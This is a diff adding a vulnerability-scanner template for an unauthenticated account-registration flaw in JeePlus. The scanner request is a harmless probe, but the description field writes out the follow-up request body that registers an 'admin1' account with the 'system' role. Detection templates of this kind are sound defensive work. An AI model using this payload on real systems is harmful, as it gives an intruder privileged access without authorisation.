@@ -1,0 +1,28 @@
+id: jeeplus-any-user-register
+
+info:
+  name: JeePlus - Any User Register
+  author: qwtd
+  severity: high
+  description: |
+    JeePlus allows remote attackers to register an account via the /a/sys/register/registerUser endpoint.
+    判断成功后增加请求体内容: mobileLogin=false&randomCode=1&roleName=system&loginName=admin1&password=1qaz!QAZ***
+  reference:
+    - https://mp.weixin.qq.com/s/juMoy2BHmepw65o4T6XejQ
+  tags: Jeeplus
+
+http:
+  - raw:
+      - |
+        POST /a/sys/register/registerUser HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - 'www.jeeplus.org'
